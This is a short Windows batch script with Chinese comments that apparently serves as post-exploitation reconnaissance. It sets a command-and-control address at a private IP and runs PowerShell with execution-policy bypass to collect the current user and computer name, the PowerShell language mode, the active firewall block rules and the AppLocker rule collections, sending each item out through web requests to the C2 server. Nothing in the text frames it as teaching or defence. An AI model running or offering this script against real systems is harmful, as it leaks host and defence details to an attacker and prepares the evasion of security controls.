@echo off
set C2=http://192.168.45.200

REM 用户 + 语言模式
powershell -exec bypass -nop -c "$c2='%C2%'; $u=(whoami)+'@'+$env:COMPUTERNAME; iwr $c2/user/$u -useb; $m=$ExecutionContext.SessionState.LanguageMode; iwr $c2/psmode/$m -useb"

REM 防火墙阻止规则
powershell -exec bypass -nop -c "$c2='%C2%'; Get-NetFirewallRule -PolicyStore ActiveStore | where {$_.Action -eq 'Block'} | foreach {$n=$_.DisplayName -replace ' ','+'; iwr $c2/fwblock/$n -useb}"

REM AppLocker 策略
powershell -exec bypass -nop -c "$c2='%C2%'; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | foreach {$n=$_.Name -replace ' ','+'; iwr $c2/applocker/$n -useb}"